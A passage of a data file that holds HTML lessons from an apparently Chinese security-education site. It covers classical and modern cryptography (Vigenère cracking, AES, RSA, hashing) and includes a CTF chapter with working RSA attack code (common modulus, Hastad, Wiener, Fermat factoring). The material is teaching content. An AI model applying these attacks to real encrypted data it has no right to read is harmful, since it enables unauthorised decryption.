class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from collections import Counter\r\n\r\ndef find_repeated_sequences(ciphertext, min_len=3):\r\n    \"\"\"在密文中寻找重复片段\"\"\"\r\n    ciphertext = ciphertext.replace(' ', '').upper()\r\n    sequences = {}\r\n    for i in range(len(ciphertext)):\r\n        for length in range(min_len, min(20, len(ciphertext) - i)):\r\n            seq = ciphertext[i:i+length]\r\n            sequences.setdefault(seq, []).append(i)\r\n    return {k: v for k, v in sequences.items() if len(v) > 1}\r\n\r\ndef kasiski_distances(repeated):\r\n    distances = []\r\n    for seq, positions in repeated.items():\r\n        for i in range(len(positions)):\r\n            for j in range(i+1, len(positions)):\r\n                distances.append(positions[j] - positions[i])\r\n    return distances\r\n\r\ndef guess_key_length(distances):\r\n    factor_count = Counter()\r\n    for d in distances:\r\n        for f in range(2, min(21, d+1)):\r\n            if d % f == 0:\r\n                factor_count[f] += 1\r\n    print(\"因子出现次数:\")\r\n    for factor, count in factor_count.most_common(5):\r\n        print(f\"  密钥长度 {factor}: 出现 {count} 次\")\r\n    return factor_count.most_common(1)[0][0]</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>4.2 重合指数法（Index of Coincidence）</h3>\r\n<p>IC 衡量密文中两个随机选取的字母相同的概率。英语文本 IC ≈ 0.0667，随机文本 IC ≈ 0.0385。测试不同密钥长度，选 IC 最接近 0.0667 的。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def index_of_coincidence(text):\r\n    letters = [ch for ch in text.upper() if ch.isalpha()]\r\n    n = len(letters)\r\n    if n <= 1: return 0\r\n    freq = Counter(letters)\r\n    return sum(f * (f - 1) for f in freq.values()) / (n * (n - 1))\r\n\r\ndef guess_key_length_ic(ciphertext):\r\n    ciphertext = ''.join(ch for ch in ciphertext if ch.isalpha())\r\n    best_len, best_ic = 1, 0\r\n    for key_len in range(1, 21):\r\n        groups = ['' for _ in range(key_len)]\r\n        for i, ch in enumerate(ciphertext):\r\n            groups[i % key_len] += ch\r\n        avg_ic = sum(index_of_coincidence(g) for g in groups) / key_len\r\n        print(f\"长度 {key_len:2d} | IC = {avg_ic:.6f}\")\r\n        if avg_ic > best_ic and key_len > 1:\r\n            best_ic, best_len = avg_ic, key_len\r\n    return best_len</code></pre></div>\r\n\r\n<h2>五、破解维吉尼亚：完整流程</h2>\r\n<p>确定密钥长度后：将密文按长度分组，每组是独立凯撒密码，逐组频率分析。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def crack_vigenere(ciphertext, key_length):\r\n    \"\"\"完整破解维吉尼亚密码\"\"\"\r\n    ciphertext = ''.join(ch for ch in ciphertext.upper() if ch.isalpha())\r\n    groups = ['' for _ in range(key_length)]\r\n    for i, ch in enumerate(ciphertext):\r\n        groups[i % key_length] += ch\r\n    key = []\r\n    for group in groups:\r\n        freq = Counter(group)\r\n        most_common = freq.most_common(1)[0][0]\r\n        shift = (ord(most_common) - ord('E')) % 26\r\n        key.append(chr(ord('A') + shift))\r\n    keyword = ''.join(key)\r\n    plaintext = vigenere_decrypt(ciphertext, keyword)\r\n    print(f\"破解的密钥: {keyword}\")\r\n    print(f\"解密明文: {plaintext}\")\r\n    return keyword, plaintext</code></pre></div>\r\n\r\n<h2>六、一次性密码本（OTP）</h2>\r\n<p>维吉尼亚被破解的根本原因是<strong>密钥循环重复</strong>。如果密钥和明文一样长、完全随机、绝不重复——那就是理论不可破解的<strong>一次性密码本</strong>。冷战时期美苏最高级通信就使用 OTP，但密钥分发问题使其无法大规模应用。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import os\r\n\r\ndef otp_encrypt(plaintext):\r\n    plain_bytes = plaintext.encode('utf-8')\r\n    key = os.urandom(len(plain_bytes))\r\n    ciphertext = bytes([p ^ k for p, k in zip(plain_bytes, key)])\r\n    return key, ciphertext\r\n\r\ndef otp_decrypt(key, ciphertext):\r\n    plain_bytes = bytes([c ^ k for c, k in zip(ciphertext, key)])\r\n    return plain_bytes.decode('utf-8')\r\n\r\nkey, ct = otp_encrypt(\"TOP SECRET MESSAGE\")\r\nprint(f\"密钥(hex): {key.hex()}\\n密文(hex): {ct.hex()}\")\r\nprint(f\"解密: {otp_decrypt(key, ct)}\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<div class=\"callout success\"><div class=\"callout-title\">本节总结</div>\r\n<ul>\r\n  <li>维吉尼亚密码 = 多表替换，用关键词循环加密</li>\r\n  <li>Kasiski 试验通过重复片段距离猜测密钥长度</li>\r\n  <li>重合指数（IC）提供更统计化的密钥长度猜测</li>\r\n  <li>确定密钥长度后，每组退化为凯撒密码</li>\r\n  <li>一次性密码本（OTP）理论完美安全，但密钥分发困难</li>\r\n</ul></div>\r\n</section>";
+
+SECTION_CONTENT["crypto-02"] = "<section id=\"crypto-02\" class=\"section\" data-key=\"crypto-02\">\r\n<div class=\"section-transition\"><p>古典密码的故事告诉我们：替换和移位终将被分析攻破。进入计算机时代后，密码学需要一种全新的思路——用<strong>复杂的位运算</strong>替代简单的字母替换。这就是对称加密的诞生。</p></div>\r\n<div class=\"section-header\">\r\n  <span class=\"chapter-tag\">crypto-02 · 对称加密</span>\r\n  <h1>从 DES 到 AES</h1>\r\n  <p class=\"subtitle\">一场算法竞赛，如何定义了现代加密标准？</p>\r\n</div>\r\n\r\n<h2>一、DES 的诞生与辉煌</h2>\r\n<p>1977 年，基于 Feistel 网络的 <strong>DES（Data Encryption Standard）</strong>被采纳为美国联邦标准。分组 64 位，密钥 56 位，16 轮。DES 的 S-Box 由 NSA 参与设计，后来发现它们被精心设计来<strong>抵抗</strong>差分密码分析——领先学术界 15 年。</p>\r\n\r\n<h2>二、DES 的结构解析</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># DES f 函数核心逻辑示意\r\nS_BOX_1 = [\r\n    [14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7],\r\n    [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8],\r\n    [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0],\r\n    [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13]\r\n]\r\n# 每轮: L'=R, R'=L xor f(R, K_i)\r\n# f: 扩展32->48位, 异或子密钥, S-Box 48->32位, P置换</code></pre></div>\r\n\r\n<h2>三、DES 的衰落</h2>\r\n<p>56 位密钥 = 2<sup>56</sup> 种可能。1999 年，Deep Crack + distributed.net 联合在 <strong>22 小时</strong>内暴力破解 DES。</p>\r\n<p><strong>3DES</strong> 应急方案：三次 DES，有效密钥 112/168 位，但速度是三倍。</p>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h2>四、AES 竞赛</h2>\r\n<p>1997 年 NIST 公开征集 AES。15 个候选算法，三年评审。2001 年比利时密码学家的 <strong>Rijndael</strong> 胜出。分组 128 位，密钥 128/192/256 位。</p>\r\n\r\n<h2>五、AES 结构：SPN 网络</h2>\r\n<p>AES 采用<strong>代换-置换网络（SPN）</strong>，每轮四步：</p>\r\n<ol>\r\n  <li><strong>SubBytes</strong>：S-Box 字节替换（非线性）</li>\r\n  <li><strong>ShiftRows</strong>：行循环移位</li>\r\n  <li><strong>MixColumns</strong>：GF(2⁸) 列混合（扩散）</li>\r\n  <li><strong>AddRoundKey</strong>：异或轮密钥</li>\r\n</ol>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from Crypto.Cipher import AES\r\nfrom Crypto.Util.Padding import pad, unpad\r\nimport os\r\n\r\n# AES-CBC 加密\r\nkey = os.urandom(16)  # 128 位\r\niv = os.urandom(16)\r\ncipher = AES.new(key, AES.MODE_CBC, iv)\r\nciphertext = cipher.encrypt(pad(b\"Hello, AES encryption!\", AES.block_size))\r\nprint(f\"密文 (hex): {ciphertext.hex()}\")\r\n\r\n# 解密\r\ncipher_dec = AES.new(key, AES.MODE_CBC, iv)\r\ndecrypted = unpad(cipher_dec.decrypt(ciphertext), AES.block_size)\r\nprint(f\"解密: {decrypted}\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h2>六、AES 工作模式</h2>\r\n<ul>\r\n  <li><strong>ECB</strong>：每块独立加密，相同明文→相同密文。<strong>永远不要用！</strong></li>\r\n  <li><strong>CBC</strong>：每块与前一块异或，需 IV</li>\r\n  <li><strong>CTR</strong>：加密计数器，并行，流密码</li>\r\n  <li><strong>GCM</strong>：CTR + GMAC 认证。<strong>最推荐！</strong></li>\r\n</ul>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from Crypto.Cipher import AES\r\nimport os\r\n\r\n# AES-GCM：认证加密\r\nkey = os.urandom(32)  # AES-256\r\ncipher = AES.new(key, AES.MODE_GCM)\r\nciphertext, tag = cipher.encrypt_and_digest(b\"Confidential data\")\r\n\r\nprint(f\"Nonce: {cipher.nonce.hex()}\")\r\nprint(f\"密文: {ciphertext.hex()}\")\r\nprint(f\"标签: {tag.hex()}\")\r\n\r\n# 解密验证\r\ndec = AES.new(key, AES.MODE_GCM, nonce=cipher.nonce)\r\ntry:\r\n    plaintext = dec.decrypt_and_verify(ciphertext, tag)\r\n    print(f\"解密成功: {plaintext}\")\r\nexcept ValueError:\r\n    print(\"认证失败！数据可能被篡改\")</code></pre></div>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">模式选择</div><p>永远不要用 ECB。优先使用 GCM：加密 + 认证一体化，性能好，无需 padding。</p></div>\r\n\r\n<h2>七、对称加密的密钥管理困境</h2>\r\n<p>无论 AES 多安全，通信双方必须共享同一个密钥。在开放互联网上如何安全交换密钥？这就是下一章——非对称加密——要解决的问题。</p>\r\n\r\n<div class=\"callout success\"><div class=\"callout-title\">本节总结</div>\r\n<ul>\r\n  <li>DES（1977）56 位密钥在 1999 年被暴力破解</li>\r\n  <li>AES（2001）SPN 结构，128/192/256 位密钥，至今安全</li>\r\n  <li>AES 每轮四步：SubBytes → ShiftRows → MixColumns → AddRoundKey</li>\r\n  <li>GCM 是最推荐的工作模式</li>\r\n  <li>对称加密的核心问题：密钥分发</li>\r\n</ul></div>\r\n</section>";
+
+SECTION_CONTENT["crypto-03"] = "<section id=\"crypto-03\" class=\"section\" data-key=\"crypto-03\">\r\n<div class=\"section-transition\"><p>对称加密解决了\"如何加密\"的问题，但留下了\"如何分发密钥\"的难题。1976 年，两位密码学家的一个大胆想法彻底改变了格局——如果加密和解密使用<strong>不同的密钥</strong>呢？</p></div>\r\n<div class=\"section-header\">\r\n  <span class=\"chapter-tag\">crypto-03 · 非对称加密</span>\r\n  <h1>RSA 原理深度解析</h1>\r\n  <p class=\"subtitle\">两个大素数的乘积，如何守护整个互联网？</p>\r\n</div>\r\n\r\n<h2>一、公钥密码学的诞生</h2>\r\n<p>1976 年 Diffie 和 Hellman 提出公钥概念。1977 年 MIT 三位教授 Rivest、Shamir、Adleman 基于大素数分解难题构造出 <strong>RSA</strong>。</p>\r\n\r\n<h2>二、数学基础</h2>\r\n<p>RSA 安全性建立在：<strong>大整数分解极其困难</strong>。两个大素数相乘容易，分解回去极难。</p>\r\n<p><strong>欧拉函数</strong>：若 n=p×q（p,q 为不同素数），则 φ(n) = (p-1)(q-1)。</p>\r\n<p><strong>欧拉定理</strong>：若 gcd(a,n)=1，则 a<sup>φ(n)</sup> ≡ 1 (mod n)。这保证了 RSA 正确性。</p>\r\n\r\n<h2>三、RSA 算法：用超小数字走一遍</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># RSA 密钥生成（小数字示例）\r\np, q = 3, 11\r\nn = p * q                    # n = 33\r\nphi = (p-1) * (q-1)          # phi = 20\r\ne = 7                        # gcd(7, 20) = 1\r\nd = pow(e, -1, phi)          # d = 3 (7*3=21≡1 mod 20)\r\n\r\nprint(f\"公钥: (e={e}, n={n})\")\r\nprint(f\"私钥: (d={d}, n={n})\")\r\n\r\n# 加密\r\nmessage = 5\r\nciphertext = pow(message, e, n)  # 5^7 mod 33 = 14\r\nprint(f\"加密: {message} -> {ciphertext}\")\r\n\r\n# 解密\r\ndecrypted = pow(ciphertext, d, n)  # 14^3 mod 33 = 5\r\nprint(f\"解密: {ciphertext} -> {decrypted}\")</code></pre></div>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">为什么能正确解密？</div>\r\n<p>c<sup>d</sup> = (m<sup>e</sup>)<sup>d</sup> = m<sup>ed</sup> mod n。因为 ed ≡ 1 (mod φ(n))，根据欧拉定理 m<sup>ed</sup> ≡ m (mod n)。</p></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>完整 Python RSA 实现</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import math, random\r\n\r\ndef is_prime(n, k=10):\r\n    \"\"\"Miller-Rabin 素性测试\"\"\"\r\n    if n < 2: return False\r\n    if n in (2, 3): return True\r\n    if n % 2 == 0: return False\r\n    r, d = 0, n - 1\r\n    while d % 2 == 0: r, d = r + 1, d // 2\r\n    for _ in range(k):\r\n        a = random.randrange(2, n - 1)\r\n        x = pow(a, d, n)\r\n        if x in (1, n - 1): continue\r\n        for _ in range(r - 1):\r\n            x = pow(x, 2, n)\r\n            if x == n - 1: break\r\n        else: return False\r\n    return True\r\n\r\ndef generate_prime(bits):\r\n    while True:\r\n        n = random.getrandbits(bits)\r\n        n |= (1 << (bits - 1)) | 1\r\n        if is_prime(n): return n\r\n\r\ndef generate_rsa_keys(bits=512):\r\n    p = generate_prime(bits // 2)\r\n    q = generate_prime(bits // 2)\r\n    while p == q: q = generate_prime(bits // 2)\r\n    n = p * q\r\n    phi = (p-1) * (q-1)\r\n    e = 65537\r\n    assert math.gcd(e, phi) == 1\r\n    d = pow(e, -1, phi)\r\n    return {'public': (e, n), 'private': (d, n), 'p': p, 'q': q}\r\n\r\nkeys = generate_rsa_keys(512)\r\nmsg = 42\r\nct = pow(msg, *keys['public'])\r\npt = pow(ct, *keys['private'])\r\nprint(f\"加密 {msg} -> 密文 -> 解密 {pt}\")</code></pre></div>\r\n\r\n<h3>实际使用 RSA（OAEP 填充）</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from Crypto.PublicKey import RSA\r\nfrom Crypto.Cipher import PKCS1_OAEP\r\n\r\nkey = RSA.generate(2048)\r\ncipher = PKCS1_OAEP.new(key.publickey())\r\nciphertext = cipher.encrypt(b\"Hello RSA with OAEP padding!\")\r\n\r\ndec = PKCS1_OAEP.new(key)\r\nprint(f\"解密: {dec.decrypt(ciphertext)}\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h2>四、密钥长度与安全</h2>\r\n<p>512 位 1999 年被破解，768 位 2009 年被破解。目前推荐 <strong>2048 位或更高</strong>。RSA 太慢（比 AES 慢 1000 倍），实际用于密钥协商、数字签名和证书。</p>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">RSA 常见陷阱</div>\r\n<p>1. 不用填充直接加密 → 确定性，可被枚举<br>\r\n2. 共享模数 → 公模攻击<br>\r\n3. 小 e + 小消息 → m^e < n，直接开方<br>\r\n4. 必须使用 OAEP 填充</p></div>\r\n\r\n<h2>五、Diffie-Hellman 密钥交换</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># Diffie-Hellman 密钥交换\r\np, g = 23, 5  # 公开参数\r\na = 6          # Alice 私钥\r\nA = pow(g, a, p)  # Alice 公钥 = 8\r\nb = 15         # Bob 私钥\r\nB = pow(g, b, p)  # Bob 公钥 = 19\r\n\r\nshared_a = pow(B, a, p)  # = 2\r\nshared_b = pow(A, b, p)  # = 2\r\nprint(f\"共享密钥相同: {shared_a == shared_b}\")</code></pre></div>\r\n\r\n<div class=\"callout success\"><div class=\"callout-title\">本节总结</div>\r\n<ul>\r\n  <li>RSA 基于大整数分解难题</li>\r\n  <li>加密: c = m<sup>e</sup> mod n，解密: m = c<sup>d</sup> mod n</li>\r\n  <li>RSA 很慢，实际用于密钥交换和签名</li>\r\n  <li>推荐 2048 位以上，必须使用 OAEP 填充</li>\r\n  <li>DH 提供另一种密钥协商方案</li>\r\n</ul></div>\r\n\r\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(1)\">▶ RSA Baby</button>\r\n</section>";
+
+SECTION_CONTENT["crypto-03-02"] = "<section id=\"crypto-03-02\" class=\"section\" data-key=\"crypto-03-02\">\r\n<div class=\"section-transition\"><p>上一章我们理解了 RSA 的数学之美。但在 CTF 竞赛和真实攻击中，RSA 的不当实现有各种可被利用的漏洞。让我们从攻击者视角审视 RSA。</p></div>\r\n<div class=\"section-header\">\r\n  <span class=\"chapter-tag\">crypto-03 · 非对称加密</span>\r\n  <h1>RSA CTF 攻击技术</h1>\r\n  <p class=\"subtitle\">当数学遇上实现漏洞，RSA 的七种致命弱点</p>\r\n</div>\r\n\r\n<h2>一、攻击者思维</h2>\r\n<p>CTF 中 RSA 题目故意留下数学漏洞。你的任务是识别漏洞类型并编写攻击代码。</p>\r\n\r\n<h2>二、攻击 1：小 n 直接分解</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from sympy import factorint\r\nfrom Crypto.Util.number import long_to_bytes\r\n\r\nn, e, c = 8924761489, 65537, 5517937891\r\nfactors = factorint(n)\r\np, q = list(factors.keys())\r\nphi = (p-1)*(q-1)\r\nd = pow(e, -1, phi)\r\nm = pow(c, d, n)\r\nprint(f\"明文: {long_to_bytes(m)}\")\r\n# 第一步永远是查 factordb.com！</code></pre></div>\r\n\r\n<h2>三、攻击 2：共模攻击（Common Modulus）</h2>\r\n<p>同一消息用相同 n、不同 e 加密两次。利用扩展欧几里得：s·e₁ + t·e₂ = 1 → m = c₁<sup>s</sup> · c₂<sup>t</sup> mod n。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def extended_gcd(a, b):\r\n    if a == 0: return b, 0, 1\r\n    g, x1, y1 = extended_gcd(b % a, a)\r\n    return g, y1 - (b // a) * x1, x1\r\n\r\ndef common_modulus_attack(n, e1, e2, c1, c2):\r\n    _, s, t = extended_gcd(e1, e2)\r\n    if s < 0: c1, s = pow(c1, -1, n), -s\r\n    if t < 0: c2, t = pow(c2, -1, n), -t\r\n    return (pow(c1, s, n) * pow(c2, t, n)) % n\r\n\r\nn = 2103791004963745643697316378902702370720167444507829559294967667\r\ne1, e2 = 65537, 257\r\nc1 = 155823120348906624540196188538480767292337710381452963284789237\r\nc2 = 184370643729802667598541503689297564960614636644633897051506804\r\nm = common_modulus_attack(n, e1, e2, c1, c2)\r\nprint(f\"解密: {long_to_bytes(m)}\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h2>四、攻击 3：Hastad 广播攻击</h2>\r\n<p>同一消息用 e=3 发给 3 个接收者。用中国剩余定理计算 m³ mod (n₁n₂n₃)，直接开三次方。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from sympy.ntheory.modular import crt\r\nfrom gmpy2 import iroot\r\n\r\ndef hastad_broadcast(n_list, c_list, e=3):\r\n    remainder, _ = crt(n_list[:e], c_list[:e])\r\n    m, exact = iroot(int(remainder), e)\r\n    if exact:\r\n        print(f\"攻击成功! m = {m}\")\r\n        return int(m)\r\n    return None</code></pre></div>\r\n\r\n<h2>五、攻击 4：Wiener 攻击（小 d）</h2>\r\n<p>当 d < n<sup>1/4</sup>/3 时，通过连分数展开 e/n 恢复 d。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from gmpy2 import isqrt\r\n\r\ndef continued_fraction(n, d):\r\n    cf = []\r\n    while d: cf.append(n // d); n, d = d, n % d\r\n    return cf\r\n\r\ndef convergents(cf):\r\n    convs = []\r\n    for i in range(len(cf)):\r\n        num, den = 1, 0\r\n        for j in range(i, -1, -1):\r\n            num, den = den + cf[j] * num, num\r\n        convs.append((num, den))\r\n    return convs\r\n\r\ndef wiener_attack(e, n):\r\n    cf = continued_fraction(e, n)\r\n    for k, d in convergents(cf):\r\n        if k == 0 or (e*d-1) % k != 0: continue\r\n        phi = (e*d-1) // k\r\n        s = n - phi + 1\r\n        disc = s*s - 4*n\r\n        if disc < 0: continue\r\n        t = isqrt(disc)\r\n        if t*t == disc:\r\n            p, q = (s+t)//2, (s-t)//2\r\n            if p*q == n:\r\n                print(f\"成功! p={p}, q={q}, d={d}\")\r\n                return d, p, q\r\n    return None</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h2>六、攻击 5：Fermat 分解（p, q 太接近）</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from gmpy2 import isqrt, is_square\r\n\r\ndef fermat_factor(n):\r\n    a = isqrt(n) + 1\r\n    b2 = a*a - n\r\n    iters = 0\r\n    while not is_square(b2):\r\n        a += 1; b2 = a*a - n; iters += 1\r\n        if iters > 1000000: return None\r\n    b = isqrt(b2)\r\n    p, q = a + b, a - b\r\n    print(f\"Fermat 成功! {iters} 次迭代\")\r\n    return int(p), int(q)</code></pre></div>\r\n\r\n<h2>七、攻击 6：Rabin 加密（e=2）</h2>\r\n<p>e=2 时解密产生四个候选解，需要用上下文判断哪个是正确明文。</p>\r\n\r\n<h2>八、攻击 7：Coppersmith 短填充攻击</h2>\r\n<p>当明文大部分已知时，利用格基约化（LLL）恢复完整明文。推荐使用 SageMath 的 <code>small_roots()</code> 方法。</p>\r\n\r\n<h2>九、CTF 攻击决策树</h2>\r\n<ol>\r\n  <li>n 能分解？→ factordb, Fermat, Pollard</li>\r\n  <li>多组 (n,e,c)？→ 共模 / 广播攻击</li>\r\n  <li>e 很小？→ 广播攻击 / 直接开方</li>\r\n  <li>d 很小？→ Wiener 攻击</li>\r\n  <li>p,q 接近？→ Fermat 分解</li>\r\n  <li>部分明文已知？→ Coppersmith</li>\r\n</ol>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<div class=\"callout success\"><div class=\"callout-title\">本节总结</div>\r\n<ul>\r\n  <li>小 n → 直接分解（factordb）</li>\r\n  <li>共模 → 扩展欧几里得</li>\r\n  <li>广播 → 中国剩余定理 + 开方</li>\r\n  <li>小 d → Wiener 连分数</li>\r\n  <li>p,q 接近 → Fermat</li>\r\n  <li>安全实践：2048+ 位, OAEP, 随机密钥</li>\r\n</ul></div>\r\n\r\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(6)\">▶ RSA 公模攻击</button>\r\n</section>\r\n\r\n\n<!-- ============================================================\n     CyberEdu Cryptography Module - Sections 6-10\n     Hash Functions, Digital Signatures, TLS, Certificate Transparency\n     ============================================================ -->";
+
+SECTION_CONTENT["crypto-04"] = "<section id=\"crypto-04\" class=\"section\" data-key=\"crypto-04\">\n<div class=\"section-transition\"><p>掌握了 RSA 攻防后，我们来看另一类密码学工具——哈希函数。与加密不同，哈希是单向的：你可以轻松计算出一个文件的\"指纹\"，但永远无法从指纹还原文件。这个看似简单的特性，却是整个数字世界的完整性基石。</p></div>\n<div class=\"section-header\">\n  <span class=\"chapter-tag\">crypto-04 · 哈希函数</span>\n  <h1>MD5/SHA 系列深度对比</h1>\n  <p class=\"subtitle\">一位中国数学家的突破，如何让全球数十亿证书作废？</p>\n</div>\n\n<h2>一、2004 年 8 月 17 日：密码学界的\"地震\"</h2>\n<p>在美国加州圣巴巴拉举行的 CRYPTO 2004 大会上，中国密码学家<strong>王小云</strong>教授做了一场报告。她宣布找到了 MD5 的碰撞——两个不同的输入产生完全相同的 MD5 哈希值。全场震惊。</p>\n<p>更令人难以置信的是，她的攻击不仅针对 MD5，还同时击破了 MD4、HAVAL-128、RIPEMD-128 等多个算法。两年后，她又攻破了 SHA-1——当时被认为\"更安全\"的替代方案。</p>\n<p>这不是学术游戏。MD5 被广泛用于数字证书、密码存储、文件校验。碰撞攻击意味着攻击者可以伪造证书——创建两个内容完全不同但哈希值相同的文件，让 CA 对\"合法\"文件签名，然后将签名移植到\"恶意\"文件上。</p>\n\n<div class=\"callout info\"><div class=\"callout-title\">历史背景</div><p>2008 年，一群安全研究者利用 MD5 碰撞攻击成功伪造了 SSL 证书。他们创建了一个\"合法\"的证书签名请求和一个恶意的 CA 证书，两者 MD5 哈希值完全相同。用合法请求获得 CA 签名后，将签名附加到恶意证书上——浏览器完全信任这个伪造的 CA 证书。</p></div>\n\n<h2>二、什么是哈希函数？</h2>\n<p>哈希函数（Hash Function）将<strong>任意长度</strong>的输入映射为<strong>固定长度</strong>的输出。这个输出称为哈希值（hash）、摘要（digest）或指纹（fingerprint）。</p>\n\n<p>一个密码学安全的哈希函数必须满足三个核心性质：</p>\n<ul>\n  <li><strong>抗原像（Pre-image Resistance）</strong>：给定哈希值 h，找到任何满足 hash(m) = h 的消息 m 在计算上不可行。即\"单向性\"。</li>\n  <li><strong>抗第二原像（Second Pre-image Resistance）</strong>：给定消息 m₁，找到另一个 m₂ ≠ m₁ 使得 hash(m₁) = hash(m₂) 在计算上不可行。</li>\n  <li><strong>抗碰撞（Collision Resistance）</strong>：找到任何一对 (m₁, m₂) 使得 m₁ ≠ m₂ 且 hash(m₁) = hash(m₂) 在计算上不可行。</li>\n</ul>\n\n<div class=\"callout default\"><div class=\"callout-title\">思考</div><p>为什么碰撞\"理论上必然存在\"？因为输入空间无限（任意长度），输出空间有限（比如 MD5 只有 2<sup>128</sup> 种输出）。根据鸽巢原理，碰撞必然存在。问题只在于能否<em>高效找到</em>碰撞。</p></div>\n\n<h2>三、MD5 的内部结构</h2>\n<p>MD5 由 Ron Rivest（RSA 的\"R\"）于 1991 年设计，输出 128 位（16 字节）哈希值。它采用 <strong>Merkle-Damgard</strong> 结构：将消息分成 512 位的块，逐块压缩。</p>\n\n<h3>3.1 Merkle-Damgard 结构</h3>\n<p>核心思想很简单：</p>\n<ol>\n  <li>将消息填充到 512 位的整数倍</li>\n  <li>追加消息的原始长度（64 位）</li>\n  <li>从固定的初始值（IV）开始</li>\n  <li>每个 512 位的块与当前状态一起送入<strong>压缩函数</strong></li>\n  <li>最终状态就是哈希值</li>\n</ol>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\n\n# MD5 基本使用\nmessage = b\"Hello, CyberEdu!\"\nmd5_hash = hashlib.md5(message).hexdigest()\nprint(f\"消息: {message.decode()}\")\nprint(f\"MD5: {md5_hash}\")\nprint(f\"长度: {len(md5_hash)} 个十六进制字符 = {len(md5_hash)//2} 字节 = {len(md5_hash)//2 * 8} 位\")\n\n# 雪崩效应：改一个比特，哈希面目全非\nmsg1 = b\"The quick brown fox jumps over the lazy dog\"\nmsg2 = b\"The quick brown fox jumps over the lazy cog\"  # dog -> cog\nh1 = hashlib.md5(msg1).hexdigest()\nh2 = hashlib.md5(msg2).hexdigest()\nprint(f\"\\n原文: {h1}\")\nprint(f\"改动: {h2}\")\nprint(f\"差异: 几乎每一位都不同！\")</code></pre></div>\n\n<h3>3.2 MD5 压缩函数</h3>\n<p>MD5 的压缩函数包含 64 轮运算，分四组，每组使用不同的非线性函数（F、G、H、I）。每轮操作包括：位异或、位与、位或、循环左移、模加。这些操作组合在一起，目的是让输出的每一位都依赖于输入的每一位——这就是<strong>雪崩效应</strong>。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def left_rotate(n, b):\n    \"\"\"32位循环左移\"\"\"\n    return ((n << b) | (n >> (32 - b))) & 0xFFFFFFFF\n\n# MD5 的四轮非线性函数\ndef F(x, y, z): return (x & y) | (~x & z)\ndef G(x, y, z): return (x & z) | (y & ~z)\ndef H(x, y, z): return x ^ y ^ z\ndef I(x, y, z): return y ^ (x | ~z)\n\n# 简化示意：一轮操作\n# a = b + left_rotate(a + F(b,c,d) + M[k] + T[i], s)\n# 其中 M[k] 是消息子块，T[i] 是正弦常数，s 是移位量\nprint(\"MD5 压缩函数的四个非线性函数：\")\nprint(\"F(X,Y,Z) = (X AND Y) OR (NOT X AND Z)\")\nprint(\"G(X,Y,Z) = (X AND Z) OR (Y AND NOT Z)\")\nprint(\"H(X,Y,Z) = X XOR Y XOR Z\")\nprint(\"I(X,Y,Z) = Y XOR (X OR NOT Z)\")</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>四、MD5 碰撞：从理论到实践</h2>\n\n<h3>4.1 王小云的攻击方法</h3>\n<p>王小云的突破在于发现了<strong>消息修改技术（Message Modification）</strong>。她没有盲目搜索碰撞，而是：</p>\n<ol>\n  <li>先定义一条<strong>差分路径</strong>——描述两个消息在压缩函数内部应该如何差异传播</li>\n  <li>通过精确修改消息比特，强制让差分路径按照预设轨迹演化</li>\n  <li>最终使两个不同消息的哈希值完全相同</li>\n</ol>\n<p>结果：在普通 PC 上<strong>几秒钟</strong>就能找到 MD5 碰撞。</p>\n\n<h3>4.2 亲手生成 MD5 碰撞</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import hashlib\n\n# 经典的 MD5 